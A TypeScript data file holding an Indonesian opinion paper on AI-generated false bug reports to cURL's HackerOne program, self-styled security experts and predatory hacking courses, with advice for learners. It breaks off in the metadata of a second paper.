export interface DocumentSection {
  id: string;
  title: string;
  level: number;
  content: string[];
}

export interface ResearchDocument {
  id: string;
  title: string;
  subtitle: string;
  classification: "RESTRICTED" | "CONFIDENTIAL" | "PUBLIC";
  date: string;
  authors: string[];
  organization: string;
  volume: string;
  pages: number;
  abstract: string;
  keywords: string[];
  sections: DocumentSection[];
  references: string[];
}

export const documents: ResearchDocument[] = [
  {
    id: "ZERO-2025-001",
    title: "Jurnal Keamanan Siber & Etika Teknologi Indonesia",
    subtitle: "Analisis Kritis: AI Slop, Pseudo-Pakar, dan Kursus Online Predatif dalam Ekosistem Keamanan Siber Indonesia",
    classification: "PUBLIC",
    date: "April 2025",
    authors: ["pwn0sec"],
    organization: "DPTL/0B208301740319",
    volume: "Vol. 1 | No. 1",
    pages: 25,
    abstract: "Makalah ini menganalisis secara kritis dua fenomena yang saling berkaitan dan sama-sama mengancam integritas komunitas keamanan siber Indonesia: pertama, meningkatnya ketergantungan peneliti pemula terhadap alat Kecerdasan Buatan (AI) untuk menghasilkan laporan kerentanan tanpa pemahaman teknis yang memadai; kedua, proliferasi pseudo-pakar teknologi yang mengeksploitasi kesenjangan literasi digital masyarakat melalui kursus online berbayar yang tidak bermutu. Berdasarkan observasi empiris terhadap laporan-laporan di platform bug bounty HackerOne -- khususnya program cURL -- serta analisis terhadap ekosistem edukasi keamanan siber daring di Indonesia, makalah ini memaparkan: (1) batasan fundamental AI sebagai alat pencarian kerentanan mandiri; (2) anatomi dan modus operandi pseudo-pakar teknologi yang menyamarkan ketidakmampuan di balik terminologi teknis; (3) mekanisme predasi melalui kursus online yang menjanjikan keahlian hacking instan; serta (4) dampak sistemik kedua fenomena tersebut terhadap kepercayaan publik, reputasi komunitas, dan keamanan nasional. Makalah diakhiri dengan kerangka metodologis untuk mengidentifikasi kursus dan mentor yang legitimate, serta panduan pengembangan kompetensi yang berbasis ilmu pengetahuan otentik.",
    keywords: ["keamanan siber", "kecerdasan buatan", "bug bounty", "HackerOne", "cURL", "pseudo-pakar", "kursus online predatif", "AI slop", "vulnerability research", "etika digital", "literasi teknologi", "komunitas Indonesia"],
    sections: [
      {
        id: "bab-1",
        title: "BAB I: PENDAHULUAN",
        level: 1,
        content: [
          "Seiring berkembangnya permukaan serangan digital, permintaan terhadap peneliti keamanan berkualitas tinggi pun melonjak secara eksponensial. Platform bug bounty seperti HackerOne, Bugcrowd, dan Intigriti telah menjadi ekosistem vital yang menghubungkan peneliti independen dengan organisasi yang membutuhkan perspektif keamanan eksternal.",
          "Di tengah dinamika ini, dua fenomena paralel muncul dan saling memperkuat satu sama lain. Pertama, kemunculan model bahasa besar (Large Language Models/LLMs) dan alat AI generatif memunculkan ekspektasi keliru bahwa AI dapat \"meretas sistem secara otomatis\" tanpa pemahaman teknis. Kedua, proliferasi pelaku yang mengklaim diri sebagai pakar keamanan siber atau \"hacker profesional\" namun sesungguhnya tidak memiliki kompetensi substansial -- dan memonetisasi klaim palsu tersebut melalui kursus online berbayar yang menargetkan masyarakat awam.",
          "Kedua fenomena ini tidak berdiri sendiri. Mereka adalah simptom dari permasalahan yang lebih mendasar: kesenjangan literasi teknologi yang lebar di masyarakat Indonesia, yang menciptakan ruang subur bagi ilusi dan eksploitasi."
        ]
      },
      {
        id: "bab-1-2",
        title: "1.2 Perumusan Masalah",
        level: 2,
        content: [
          "Makalah ini mengajukan empat pertanyaan penelitian utama:",
          "1. Apakah AI memiliki kapabilitas fundamental untuk secara mandiri menemukan dan memvalidasi kerentanan perangkat lunak yang kompleks?",
          "2. Siapakah pseudo-pakar teknologi itu, bagaimana ciri-cirinya, dan mengapa mereka berbahaya bagi komunitas?",
          "3. Bagaimana modus operandi kursus online predatif dalam eksploitasi kesenjangan literasi digital, dan apa dampaknya terhadap korban?",
          "4. Apa kerangka kerja yang dapat digunakan untuk membedakan kompetensi sejati dari ilusi kompetensi dalam konteks keamanan siber?"
        ]
      },
      {
        id: "bab-1-3",
        title: "1.3 Tujuan dan Manfaat",
        level: 2,
        content: [
          "Makalah ini bertujuan untuk:",
          "-- Memberikan analisis teknis mendalam mengenai batasan kapabilitas AI dalam riset keamanan siber.",
          "-- Mendefinisikan dan mendokumentasikan fenomena pseudo-pakar teknologi di Indonesia secara sistematis.",
          "-- Menganalisis mekanisme dan dampak kursus online predatif dalam ekosistem edukasi keamanan siber.",
          "-- Menyajikan studi kasus konkret sebagai ilustrasi empiris.",
          "-- Menawarkan panduan praktis bagi masyarakat untuk melindungi diri dari penipuan berkedok edukasi teknologi.",
          "-- Mendorong budaya riset keamanan yang berbasis ilmu pengetahuan, etika, dan integritas di komunitas Indonesia."
        ]
      },
      {
        id: "bab-1-4",
        title: "1.4 Metodologi",
        level: 2,
        content: [
          "Makalah ini menggunakan pendekatan analisis deskriptif-kualitatif berbasis observasi partisipatif. Data primer bersumber dari pengamatan langsung terhadap laporan yang diajukan ke platform HackerOne, khususnya pada program bug bounty cURL antara tahun 2023-2024. Data sekunder diperoleh dari dokumentasi yang dipublikasikan oleh Daniel Stenberg (pengembang cURL), diskusi di Hacker News, dan analisis konten kursus online keamanan siber yang beredar di Indonesia."
        ]
      },
      {
        id: "bab-2",
        title: "BAB II: TINJAUAN LITERATUR DAN KERANGKA TEORITIS",
        level: 1,
        content: []
      },
      {
        id: "bab-2-1",
        title: "2.1 Evolusi Riset Kerentanan Perangkat Lunak",
        level: 2,
        content: [
          "Riset kerentanan (vulnerability research) adalah disiplin ilmu yang bertujuan mengidentifikasi, menganalisis, dan mendokumentasikan kelemahan dalam sistem komputer yang dapat dieksploitasi pihak tidak berwenang. Sejarahnya dapat ditelusuri ke era 1980-an ketika komunitas hacker etis pertama kali mulai mendokumentasikan kelemahan sistem secara sistematik.",
          "[TABLE:Era 1980-1990an|Eksplorasi manual sistem UNIX; budaya hacker etis terbentuk],[Era 2000-2010an|Fuzzing otomatis; analisis biner; munculnya platform CVE publik],[Era 2010-2020an|Platform bug bounty; penelitian terdistribusi global; responsible disclosure],[Era 2020-Sekarang|Keterlibatan AI/ML; debat peran otomatisasi; proliferasi pseudo-expert]"
        ]
      },
      {
        id: "bab-2-2",
        title: "2.2 Kecerdasan Buatan dalam Keamanan Siber",
        level: 2,
        content: [
          "AI telah berhasil diaplikasikan pada sejumlah domain keamanan yang terbatas, antara lain: deteksi anomali berbasis perilaku jaringan (IDS/IPS berbasis ML), klasifikasi malware menggunakan supervised learning, analisis log dalam skala besar, dan generasi fuzzing input dasar. Namun, peneliti kelas dunia seperti yang tergabung dalam Project Zero Google dan Offensive Security secara konsisten menegaskan bahwa penemuan kerentanan tingkat tinggi masih sepenuhnya bergantung pada kapabilitas kognitif manusia."
        ]
      },
      {
        id: "bab-2-3",
        title: "2.3 Ekosistem Bug Bounty dan Standar Kualitas",
        level: 2,
        content: [
          "Platform HackerOne menetapkan standar ketat dalam penilaian laporan kerentanan. Sebuah laporan dinilai valid apabila memenuhi kriteria: dapat direproduksi secara konsisten, berada dalam scope program, berdampak nyata terhadap keamanan, disertai PoC yang berfungsi, dan mengikuti disclosure policy. Laporan yang gagal mendapatkan status Informative, Duplicate, atau Not Applicable (NA)."
        ]
      },
      {
        id: "bab-2-4",
        title: "2.4 Konsep Dunning-Kruger Effect dalam Konteks Teknologi",
        level: 2,
        content: [
          "Efek Dunning-Kruger, pertama kali dipaparkan oleh David Dunning dan Justin Kruger (1999), mendeskripsikan fenomena kognitif di mana individu dengan kompetensi rendah secara sistematis melebih-lebihkan kemampuan mereka sendiri. Sebaliknya, individu yang sangat kompeten cenderung meremehkan kemampuan mereka karena mereka menyadari betapa kompleksnya domain tersebut.",
          "Dalam konteks keamanan siber, efek ini menghasilkan paradoks yang berbahaya: seorang pemula yang baru belajar menggunakan tools otomatis selama seminggu dapat merasa lebih percaya diri daripada peneliti berpengalaman yang memahami betapa dalamnya ketidaktahuan yang masih perlu ia atasi. Pseudo-pakar teknologi adalah manifestasi ekstrem dari efek Dunning-Kruger -- dan mereka secara aktif mengeksploitasinya untuk keuntungan finansial."
        ]
      },
      {
        id: "bab-3",
        title: "BAB III: MENGAPA AI TIDAK DAPAT MENEMUKAN KERENTANAN SECARA MANDIRI",
        level: 1,
        content: []
      },
      {
        id: "bab-3-1",
        title: "3.1 Perbedaan Fundamental: Pola Statistik vs. Pemahaman Kausal",
        level: 2,
        content: [
          "Inti permasalahan terletak pada perbedaan mendasar antara cara kerja AI dan proses kognitif yang dibutuhkan dalam riset keamanan. AI generatif beroperasi berdasarkan pengenalan dan reproduksi pola statistik dari data pelatihan. Ini sangat berbeda dari proses berpikir yang diperlukan untuk menemukan kerentanan baru.",
          "Sebuah kerentanan yang belum pernah ada sebelumnya -- disebut zero-day -- tidak memiliki representasi statistik yang memadai dalam data pelatihan AI. Secara teoritikal, AI tidak dapat menemukan apa yang belum pernah diketahui. Ia hanya mampu memproyeksikan pola kerentanan yang sudah didokumentasikan ke dalam kode baru, menghasilkan tingkat false positive yang tinggi dan false negative yang berbahaya.",
          "[QUOTE:\"The fool doth think he is wise, but the wise man knows himself to be a fool.\" -- William Shakespeare, As You Like It. Dalam konteks keamanan siber modern: seorang pemula yang baru mengenal Kali Linux merasa dirinya hacker; seorang peneliti veteran yang telah menemukan puluhan CVE tahu betapa banyak yang belum ia ketahui.]"
        ]
      },
      {
        id: "bab-3-2",
        title: "3.2 Lima Dimensi Kapabilitas yang Tidak Dimiliki AI",
        level: 2,
        content: [
          "3.2.1 Pemahaman Semantik Kode yang Mendalam -- Membaca kode adalah satu hal; memahami implikasi keamanannya dalam konteks eksekusi nyata adalah hal yang berbeda sepenuhnya. AI melihat kode sebagai teks; peneliti keamanan melihat kode sebagai sistem dinamis yang berinteraksi dengan prosesor, memori, OS, dan jaringan secara simultan.",
          "3.2.2 Intuisi dan Naluri Analitis -- Setelah ribuan jam menganalisis kode dan binary, peneliti keamanan mengembangkan apa yang disebut sebagai security intuition -- kemampuan untuk merasakan di mana kerentanan kemungkinan besar bersembunyi bahkan sebelum analisis formal dilakukan.",
          "3.2.3 Eksplorasi Hipotesis Iteratif -- Riset keamanan sesungguhnya adalah siklus ilmiah: membangun hipotesis, merancang eksperimen, menginterpretasikan hasil yang ambigu, merevisi hipotesis, dan mengulanginya.",
          "3.2.4 Pemahaman Konteks Bisnis dan Logika Aplikasi -- Banyak kerentanan paling berharga -- terutama dalam kategori logika bisnis -- tidak terlihat melalui analisis kode saja.",
          "3.2.5 Reverse Engineering dan Analisis Biner -- Sebagian besar perangkat lunak komersial tidak menyediakan kode sumber. Menemukan kerentanan dalam software closed-source memerlukan kemampuan membaca bahasa assembly, memahami konvensi pemanggilan fungsi berbagai arsitektur prosesor."
        ]
      },
      {
        id: "bab-3-3",
        title: "3.3 Taksonomi Kerentanan yang Tidak Dapat Ditemukan AI",
        level: 2,
        content: [
          "[TABLE_HEADER:JENIS KERENTANAN|MENGAPA AI TIDAK BISA|KEMAMPUAN AI]",
          "[TABLE:Race Condition / TOCTOU|Timing & thread scheduling|Sangat Rendah],[Heap UAF & Overflow|Manajemen memori tingkat rendah|Sangat Rendah],[Type Confusion Biner|ABI & representasi tipe data|Sangat Rendah],[Logic Flaws Autentikasi|Model ancaman aplikasi menyeluruh|Rendah],[Chained Vulnerabilities|Kreativitas menghubungkan bug|Sangat Rendah],[Side-Channel Attacks|Eksperimen fisik & pengukuran|Tidak Ada],[Format String Zero-Day|Penggunaan variadic functions|Rendah],[Integer Overflow Kontekstual|Platform-specific compiler behavior|Sangat Rendah]"
        ]
      },
      {
        id: "bab-4",
        title: "BAB IV: STUDI KASUS -- AI SLOP PADA PROGRAM BUG BOUNTY cURL",
        level: 1,
        content: []
      },
      {
        id: "bab-4-1",
        title: "4.1 Mengapa cURL Adalah Target yang Sangat Tidak Tepat bagi Pemula",
        level: 2,
        content: [
          "cURL adalah perpustakaan transfer data dan alat command-line yang dikembangkan Daniel Stenberg sejak 1998. Digunakan oleh miliaran perangkat dan dipercaya sebagai komponen inti ribuan aplikasi produksi global, cURL adalah salah satu proyek open-source yang paling kritis sekaligus paling teliti diaudit di dunia.",
          "Menemukan kerentanan valid di cURL memerlukan pemahaman mendalam tentang puluhan protokol jaringan (HTTP/1.1, HTTP/2, HTTP/3, FTP, SMTP, IMAP, LDAP, dan lebih dari 25 lainnya), implementasi TLS/SSL dan manajemen sertifikat X.509, manajemen memori tingkat rendah dalam bahasa C termasuk aritmetika pointer, parsing kompleks URI sesuai RFC, dan perilaku berbeda antara puluhan platform.",
          "[QUOTE:cURL bukan website atau aplikasi web yang dapat dipindai dengan scanner otomatis. cURL adalah perangkat lunak sistem tingkat rendah dalam bahasa C -- wilayah di mana kesalahan satu byte dapat mengubah perilaku eksekusi secara fundamental. Menargetkannya menggunakan AI tanpa memahami bahasa C sama saja dengan mencoba mereparasi mesin jet tanpa pernah mempelajari aerodinamika.]"
        ]
      },
      {
        id: "bab-4-2",
        title: "4.2 Pola AI Slop yang Teridentifikasi",
        level: 2,
        content: [
          "Komunitas keamanan dan Daniel Stenberg sendiri telah mendokumentasikan membanjirnya laporan kerentanan yang dihasilkan AI ke program cURL. Laporan-laporan ini menunjukkan pola yang sangat konsisten:",
          "-- Bahasa laporan terstruktur sempurna namun tidak memiliki substansi teknis yang dapat diverifikasi.",
          "-- Klaim kerentanan yang bertentangan dengan arsitektur dan desain cURL yang sebenarnya.",
          "-- Proof-of-concept yang tidak dapat direproduksi atau tidak masuk akal secara teknis.",
          "-- Terminologi teknis digunakan secara tidak tepat atau dicampur secara inkoheren.",
          "-- Tidak adanya pemahaman bahwa cURL adalah library C, bukan aplikasi web atau layanan cloud.",
          "-- Penggunaan kategori kerentanan yang tidak diakui dalam standar CWE, CVE, atau OWASP."
        ]
      },
      {
        id: "bab-4-3",
        title: "4.3 Analisis Tiga Laporan Representatif",
        level: 2,
        content: [
          "4.3.1 Buffer Overflow Risk in Curl_inet_ntop -- Laporan ini mengklaim risiko buffer overflow dalam fungsi Curl_inet_ntop. Analisis teknis terhadap implementasi aktual menunjukkan: ukuran buffer yang dialokasikan sudah didefinisikan dengan tepat sesuai RFC 4291 (INET6_ADDRSTRLEN = 46 bytes), tidak ada vektor input yang dapat dikontrol penyerang secara langsung. Klaim muncul dari AI yang mencocokkan pola \"fungsi konversi string\" dengan pola kerentanan buffer overflow tanpa memvalidasi konteks. Status: Not Applicable.",
          "4.3.2 Silent TLS Trust Model Hijacking via Design -- Laporan ini mengklaim desain model kepercayaan TLS cURL memungkinkan serangan Man-in-the-Middle yang \"senyap\". Ini mencerminkan ketidakpahaman mendasar: model kepercayaan sertifikat TLS adalah by design, bukan kerentanan. Ini setara dengan mengklaim bahwa pintu rumah \"rentan\" karena dapat dibuka dengan kunci yang benar. Status: Ditolak.",
          "4.3.3 Arbitrary Configuration File Inclusion (ACFI) -- Laporan ini mengklaim kerentanan \"Arbitrary Configuration File Inclusion\" melalui fitur file konfigurasi. Istilah \"ACFI\" tidak diakui dalam standar CWE, CVE, atau OWASP. Ini adalah terminologi yang diciptakan AI. Status: Not Applicable."
        ]
      },
      {
        id: "bab-5",
        title: "BAB V: ANATOMI PSEUDO-PAKAR TEKNOLOGI",
        level: 1,
        content: []
      },
      {
        id: "bab-5-1",
        title: "5.1 Definisi dan Karakteristik",
        level: 2,
        content: [
          "Pseudo-pakar teknologi (selanjutnya disebut PPT) adalah individu yang secara aktif mengklaim keahlian teknis -- khususnya dalam bidang keamanan siber, hacking, atau pemrograman -- yang tidak dimilikinya secara substansial, dan menggunakan klaim tersebut untuk memperoleh kepercayaan publik, pengikut media sosial, atau keuntungan finansial.",
          "PPT berbeda dari pemula biasa dalam satu aspek kritis: pemula menyadari keterbatasannya dan berusaha belajar. PPT tidak menyadari (atau sengaja mengabaikan) keterbatasannya dan secara aktif memasarkan dirinya sebagai ahli."
        ]
      },
      {
        id: "bab-5-2",
        title: "5.2 Profil Psikologis dan Motivasi",
        level: 2,
        content: [
          "[TABLE_HEADER:FAKTOR PSIKOLOGIS|MANIFESTASI]",
          "[TABLE:Dunning-Kruger Effect Ekstrem|Kompetensi rendah menghasilkan kepercayaan diri yang tidak proporsional],[Confirmation Bias|Hanya menyerap informasi yang mengkonfirmasi klaim keahlian mereka],[Motivasi Finansial|Kursus, konsultasi, dan endorse produk menghasilkan pendapatan nyata],[Kebutuhan Pengakuan Sosial|Algoritma media sosial memberikan reward kepada konten yang mengklaim keahlian],[Echo Chamber Media Sosial|Audiens yang tidak kompeten tidak dapat memverifikasi klaim PPT],[Impostor Syndrome Terbalik|Alih-alih merasa tidak kompeten, PPT merasa lebih superior dari semua orang]"
        ]
      },
      {
        id: "bab-5-3",
        title: "5.3 Dua Puluh Tanda Peringatan Pseudo-Pakar Teknologi",
        level: 2,
        content: [
          "Kategori A: Tanda-tanda dalam Konten yang Dipublikasikan",
          "1. Menggunakan terminologi teknis yang tidak tepat atau mencampur jargon dari domain berbeda secara tidak koheren.",
          "2. Tidak dapat menjelaskan konsep teknis tanpa menggunakan analogi yang sangat disederhanakan hingga salah secara teknis.",
          "3. Klaim keberhasilan yang tidak dapat diverifikasi: \"saya berhasil meretas X\" tanpa CVE number, Hall of Fame entry, atau bukti apapun.",
          "4. Demonstrasi menggunakan tools yang sudah dikonfigurasi sebelumnya di lab terkontrol, dipresentasikan seolah-olah merupakan eksploitasi dunia nyata.",
          "5. Konten yang semata-mata mengulangi informasi yang sudah ada di internet tanpa menambahkan analisis atau wawasan baru.",
          "6. Menggunakan AI untuk menghasilkan penjelasan teknis dan menyajikannya sebagai pemahaman pribadi.",
          "",
          "Kategori B: Tanda-tanda dalam Interaksi dan Respons",
          "7. Tidak mampu menjawab pertanyaan teknis spesifik tanpa melarikan diri ke jawaban umum atau mengubah topik.",
          "8. Menjadi defensif atau agresif ketika kompetensinya dipertanyakan oleh seseorang yang lebih kompeten.",
          "9. Tidak memiliki profil yang dapat diverifikasi pada platform yang relevan (HackerOne, CVE database, GitHub dengan kontribusi nyata).",
          "10. Tidak dapat menulis kode fungsional di luar copy-paste dari Stack Overflow atau AI.",
          "11. Mengklaim pengalaman \"bertahun-tahun\" namun tidak dapat menyebutkan kerentanan spesifik yang pernah ditemukan.",
          "12. Tidak familiar dengan tools fundamental: GDB, Wireshark, Burp Suite, atau tools setara.",
          "",
          "Kategori C: Tanda-tanda dalam Konteks Komersial",
          "13. Menawarkan \"sertifikasi\" atau \"membership\" eksklusif yang tidak diakui oleh industri.",
          "14. Menggunakan FOMO secara agresif dalam pemasaran.",
          "15. Memberikan jaminan hasil yang tidak realistis: \"dalam 30 hari Anda akan bisa meretas apapun\".",
          "16. Menghindari diskusi teknis mendalam dalam sesi demo atau webinar.",
          "17. Tidak dapat menjawab pertanyaan teknis dari peserta kursus.",
          "18. Harga kursus yang tidak proporsional tanpa justifikasi.",
          "19. Testimonial yang tidak dapat diverifikasi.",
          "20. Menggunakan klaim asosiasi dengan perusahaan/institusi terkenal yang tidak dapat diverifikasi."
        ]
      },
      {
        id: "bab-5-4",
        title: "5.4 Mengapa PPT Berbahaya bagi Komunitas dan Publik",
        level: 2,
        content: [
          "5.4.1 Kerusakan pada Reputasi Komunitas -- Ketika PPT mengklaim menjadi representasi komunitas keamanan siber Indonesia, setiap kesalahan mereka mencoreng reputasi seluruh komunitas.",
          "5.4.2 Distorsi Ekspektasi Pasar -- Ketika PPT menentukan harga jasa berdasarkan klaim yang tidak berdasar, mereka mendistorsi persepsi pasar tentang nilai kompetensi keamanan siber yang sesungguhnya.",
          "5.4.3 Risiko Keamanan Nyata -- Organisasi yang mempercayakan keamanan sistem mereka kepada PPT mendapatkan rasa aman yang palsu. Dalam konteks infrastruktur kritis, ini dapat memiliki konsekuensi yang sangat serius."
        ]
      },
      {
        id: "bab-6",
        title: "BAB VI: ANATOMI KURSUS ONLINE PREDATIF",
        level: 1,
        content: []
      },
      {
        id: "bab-6-1",
        title: "6.1 Mengapa Keamanan Siber Menjadi Target Utama",
        level: 2,
        content: [
          "Tidak ada bidang teknologi lain yang lebih rentan terhadap komersialisasi predatif daripada keamanan siber. Beberapa faktor struktural:",
          "-- Kesenjangan pengetahuan yang lebar antara publik dan praktisi membuat evaluasi kualitas hampir mustahil bagi calon pembeli.",
          "-- Glamour dan misteri yang melekat pada kata \"hacker\" menciptakan daya tarik emosional yang kuat.",
          "-- Narasi penghasilan tinggi -- sebagian besar dilebih-lebihkan -- menciptakan motivasi finansial yang kuat.",
          "-- Tidak adanya regulasi atau standar industri yang mengikat di Indonesia.",
          "-- Algoritma media sosial yang memberikan reward kepada konten sensasional atas konten yang akurat."
        ]
      },
      {
        id: "bab-6-2",
        title: "6.2 Modus Operandi Kursus Predatif",
        level: 2,
        content: [
          "6.2.1 Fase Akuisisi: Menarik Korban -- Konten clickbait di media sosial, flexing palsu, demonstrasi alat-alat yang terkesan canggih, menciptakan urgensi artifisial, dan testimonial tidak autentik.",
          "6.2.2 Fase Konversi: Menjual Ilusi -- Memberikan akses ke tools tanpa mengajarkan fundamental, kurikulum yang superfisial, menggunakan bahasa teknis kosong, sertifikat yang tidak diakui, dan membungkus konten gratis dengan presentasi yang dipoles.",
          "6.2.3 Fase Retensi dan Upselling -- \"Komunitas eksklusif\" berbayar, mentoring one-on-one premium, kursus lanjutan, dan affiliate program."
        ]
      },
      {
        id: "bab-6-3",
        title: "6.3 Dampak terhadap Korban",
        level: 2,
        content: [
          "[TABLE_HEADER:JENIS KERUGIAN|MANIFESTASI|DAMPAK JANGKA PANJANG]",
          "[TABLE:Kerugian Finansial|Ratusan ribu hingga jutaan rupiah|Uang hilang, tidak ada kompetensi yang dapat dimonetisasi],[Kerugian Waktu|Puluhan jam belajar yang tidak produktif|Waktu yang bisa digunakan untuk belajar secara otentik],[Kerugian Psikologis|False confidence yang kontraproduktif|Frustasi saat menemui kenyataan di lapangan],[Risiko Hukum|Mencoba teknik yang dipelajari tanpa izin|Konsekuensi hukum yang serius di bawah UU ITE],[Kerugian Karir|Ekspektasi karir yang tidak realistis|Burnout dan meninggalkan bidang sepenuhnya]"
        ]
      },
      {
        id: "bab-7",
        title: "BAB VII: DAMPAK SISTEMIK DAN IMPLIKASI NASIONAL",
        level: 1,
        content: []
      },
      {
        id: "bab-7-1",
        title: "7.1 Dampak terhadap Ekosistem Bug Bounty",
        level: 2,
        content: [
          "7.1.1 Beban Triage yang Meningkat -- Tim triage di setiap program bug bounty memiliki kapasitas terbatas. Ketika laporan AI slop membanjiri antrian, laporan valid dari peneliti kompeten dapat tertunda penanganannya.",
          "7.1.2 Degradasi Kepercayaan Platform -- Vendor yang menerima terlalu banyak laporan tidak berkualitas dapat meragukan nilai program bug bounty.",
          "7.1.3 Distorsi Metrik dan Reputasi -- Ketika laporan AI slop merusak metrik secara sistematis, sistem reputasi menjadi kurang efektif."
        ]
      },
      {
        id: "bab-7-2",
        title: "7.2 Dampak terhadap Keamanan Nasional",
        level: 2,
        content: [
          "Dampak yang paling serius adalah implikasi terhadap keamanan siber nasional Indonesia:",
          "-- Infrastruktur kritis yang dianggap aman padahal belum pernah diaudit secara kompeten.",
          "-- Investasi dalam solusi keamanan yang tidak efektif berdasarkan rekomendasi PPT.",
          "-- Sumber daya manusia keamanan siber nasional yang secara statistik lemah.",
          "-- Ketergantungan pada vendor atau konsultan asing karena tidak adanya kepercayaan terhadap praktisi lokal."
        ]
      },
      {
        id: "bab-7-3",
        title: "7.3 Dampak terhadap Pengembangan Talenta Jangka Panjang",
        level: 2,
        content: [
          "Dampak yang paling insidius adalah efek jangka panjang terhadap pengembangan talenta. Ketika seseorang belajar bahwa ia dapat \"menghasilkan laporan bug bounty\" hanya dengan AI atau \"menjadi hacker\" hanya dengan kursus 30 hari, ia kehilangan motivasi untuk menempuh jalur belajar yang sesungguhnya.",
          "Hasilnya adalah generasi yang iliterasi secara teknis namun percaya diri secara palsu -- kombinasi yang berbahaya dalam domain keamanan siber."
        ]
      },
      {
        id: "bab-8",
        title: "BAB VIII: REKOMENDASI DAN PANDUAN PENGEMBANGAN KOMPETENSI OTENTIK",
        level: 1,
        content: []
      },
      {
        id: "bab-8-1",
        title: "8.1 Fondasi Teknis yang Wajib Dibangun",
        level: 2,
        content: [
          "Bagi siapa pun yang serius berkarir dalam riset keamanan:",
          "1. Pemrograman: minimal satu bahasa tingkat rendah (C/C++) dan satu bahasa scripting (Python).",
          "2. Sistem Operasi: arsitektur proses Linux dan Windows, manajemen memori virtual, kernel space vs. user space.",
          "3. Jaringan: model OSI secara mendalam, TCP/IP stack, HTTP/HTTPS, TLS/SSL, Wireshark dan tcpdump.",
          "4. Assembly dasar: mampu membaca disassembly x86/x64 menggunakan Ghidra atau IDA Free.",
          "5. Kategori kerentanan utama: CWE Top 25, OWASP Top 10.",
          "6. Debugging: GDB dengan pwndbg, atau x64dbg untuk Windows.",
          "7. Platform praktik: HackTheBox, TryHackMe, picoCTF, dan CTF competitions."
        ]
      },
      {
        id: "bab-8-2",
        title: "8.2 Metodologi Penelitian yang Benar",
        level: 2,
        content: [
          "Sebelum menargetkan program bug bounty apapun, seorang peneliti harus mampu menjawab:",
          "-- Apa yang sebenarnya dilakukan oleh perangkat lunak atau aplikasi target ini?",
          "-- Siapa yang menggunakannya, dalam konteks apa, dan apa model ancaman yang relevan?",
          "-- Apa yang terdefinisi sebagai in-scope dan out-of-scope?",
          "-- Kerentanan jenis apa yang paling relevan dengan arsitektur target?",
          "-- Apakah saya memiliki alat, pengetahuan, dan lingkungan yang diperlukan?",
          "-- Dapatkah saya mendemonstrasikan dampak kerentanan secara konkret dan terukur?"
        ]
      },
      {
        id: "bab-8-3",
        title: "8.3 Kapan Tidak Mengajukan Laporan",
        level: 2,
        content: [
          "Salah satu tanda kedewasaan seorang peneliti keamanan adalah kemampuan menahan diri. Jangan ajukan laporan apabila:",
          "-- Laporan dihasilkan sepenuhnya atau sebagian besar oleh AI tanpa verifikasi teknis mandiri.",
          "-- Anda tidak dapat menjelaskan mekanisme teknis kerentanan tanpa bantuan AI.",
          "-- Tidak ada proof-of-concept yang dapat didemonstrasikan.",
          "-- Anda tidak memiliki pemahaman dasar tentang teknologi target.",
          "-- Laporan didasarkan pada asumsi atau spekulasi tanpa bukti empiris.",
          "-- Anda tidak yakin apakah temuan berada dalam scope program."
        ]
      },
      {
        id: "bab-9",
        title: "BAB IX: KESIMPULAN",
        level: 1,
        content: [
          "Makalah ini telah memaparkan secara komprehensif dua ancaman yang saling terkait dalam ekosistem keamanan siber Indonesia: ilusi bahwa AI dapat menggantikan kompetensi teknis dalam riset kerentanan, dan ilusi bahwa pseudo-pakar dan kursus online predatif dapat memberikan kompetensi yang sesungguhnya dalam waktu singkat.",
          "Tujuh temuan utama:",
          "1. AI tidak memiliki pemahaman kausal, kontekstual, dan semantik yang diperlukan untuk riset keamanan tingkat lanjut.",
          "2. Laporan kerentanan yang dihasilkan AI tanpa verifikasi teknis mandiri hampir pasti berakhir sebagai Not Applicable.",
          "3. Pseudo-pakar teknologi adalah fenomena yang berbahaya bagi keamanan komunitas dan nasional.",
          "4. Kursus online predatif mengeksploitasi kesenjangan literasi digital dengan menjual ilusi kompetensi.",
          "5. Keamanan siber adalah sains terapan yang tidak memiliki jalan pintas yang sah.",
          "6. Komunitas keamanan siber Indonesia memiliki talenta nyata yang harus dilindungi reputasinya.",
          "7. Transformasi ekosistem yang sehat memerlukan edukasi publik, regulasi yang lebih ketat, dan penghargaan terhadap kompetensi otentik."
        ]
      }
    ],
    references: [
      "pwn0sec. (2025). Please Stop Waste Your Time for Reporting a False Security Vulnerabilities Used AI! Medium.",
      "Hacker News / Y Combinator. (2024). AI slop security reports submitted to curl. Hacker News.",
      "HackerOne. (2024). Disclosed Report: Buffer Overflow Risk in Curl_inet_ntop -- curl. https://hackerone.com/reports/2613898",
      "HackerOne. (2024). Disclosed Report: Silent TLS Trust Model Hijacking via Design -- curl. https://hackerone.com/reports/2495293",
      "HackerOne. (2024). Disclosed Report: Arbitrary Configuration File Inclusion -- curl. https://hackerone.com/reports/2597485",
      "Stenberg, D. (2024). The curl bug bounty program -- official documentation. https://curl.se/docs/bugbounty.html",
      "Stenberg, D. (2024). AI-generated security reports. https://daniel.haxx.se/blog/2024/01/02/the-i-in-llm-stands-for-intelligence/",
      "MITRE Corporation. (2024). CWE Top 25 Most Dangerous Software Weaknesses 2024. https://cwe.mitre.org/top25/",
      "OWASP Foundation. (2021). OWASP Top 10 Web Application Security Risks. https://owasp.org/Top10/",
      "HackerOne. (2024). The 2024 Hacker-Powered Security Report. https://www.hackerone.com/resources/hackerone/hacker-powered-security-report",
      "NVD / NIST. (2024). National Vulnerability Database. https://nvd.nist.gov/",
      "Dunning, D. & Kruger, J. (1999). Unskilled and Unaware of It. Journal of Personality and Social Psychology, 77(6), 1121-1134.",
      "Offensive Security. (2024). PWK -- Penetration Testing with Kali Linux: OSCP Course Overview. https://www.offensive-security.com/courses/pen-200/",
      "PortSwigger. (2024). Web Security Academy. https://portswigger.net/web-security",
      "BSSN. (2024). Laporan Tahunan Keamanan Siber Nasional 2023. https://bssn.go.id"
    ]
  },
  {
    id: "ZERO-2025-002",
    title: "Fenomena Developer Instan, Miskonsepsi tentang Cybersecurity, dan Bahaya Edukasi Teknologi yang Dibangun di Atas Ilusi",
    subtitle: "Analisis kritis dan sistematis terhadap instanisasi profesi teknologi dan miskonsepsi publik tentang definisi, kapabilitas, dan etika seorang hacker dalam ekosistem teknologi Indonesia",
    classification: "PUBLIC",
    date: "April 2025",
    authors: ["number01", "pwn0sec"],
    organization: "DPTL/0B208301740319",
    volume: "Vol. 1 | No. 2 | Seri II",
    pages: 30,
